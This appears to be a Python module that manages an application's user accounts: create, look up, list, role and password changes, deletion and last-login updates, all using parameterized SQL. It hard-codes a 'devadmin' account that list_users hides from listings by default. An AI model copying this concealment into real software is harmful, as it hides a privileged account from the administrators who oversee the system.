from auth.auth_db import get_connection
from auth.auth_security import hash_password


HIDDEN_SYSTEM_USERS = {"devadmin"}


def _row_to_user(row):
    if not row:
        return None

    return {
        "username": row["username"],
        "role": row["role"],
        "last_login_at": row["last_login_at"],
    }


def create_user(username: str, password: str, role: str):
    conn = get_connection()

    conn.execute(
        "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
        (username, hash_password(password), role),
    )

    conn.commit()
    conn.close()


def get_user(username: str):
    conn = get_connection()

    row = conn.execute(
        "SELECT username, password_hash, role, last_login_at FROM users WHERE username = ?",
        (username,),
    ).fetchone()

    conn.close()
    return row


def list_users(include_hidden: bool = False):
    conn = get_connection()

    rows = conn.execute(
        "SELECT username, role, last_login_at FROM users ORDER BY LOWER(username) ASC"
    ).fetchall()

    conn.close()

    users = []
    for row in rows:
        if not include_hidden and row["username"] in HIDDEN_SYSTEM_USERS:
            continue
        users.append(_row_to_user(row))

    return users


def update_user_role(username: str, role: str):
    conn = get_connection()

    conn.execute(
        "UPDATE users SET role = ? WHERE username = ?",
        (role, username),
    )

    conn.commit()

    row = conn.execute(
        "SELECT username, role, last_login_at FROM users WHERE username = ?",
        (username,),
    ).fetchone()

    conn.close()
    return _row_to_user(row)


def update_user_password(username: str, password: str):
    conn = get_connection()

    conn.execute(
        "UPDATE users SET password_hash = ? WHERE username = ?",
        (hash_password(password), username),
    )

    conn.commit()
    conn.close()


def delete_user(username: str):
    conn = get_connection()

    conn.execute(
        "DELETE FROM users WHERE username = ?",
        (username,),
    )

    conn.commit()
    conn.close()


def update_last_login(username: str, iso_ts: str):
    conn = get_connection()

    conn.execute(
        "UPDATE users SET last_login_at = ? WHERE username = ?",
        (iso_ts, username),
    )

    conn.commit()

    row = conn.execute(
        "SELECT username, role, last_login_at FROM users WHERE username = ?",
        (username,),
    ).fetchone()

    conn.close()
    return _row_to_user(row)
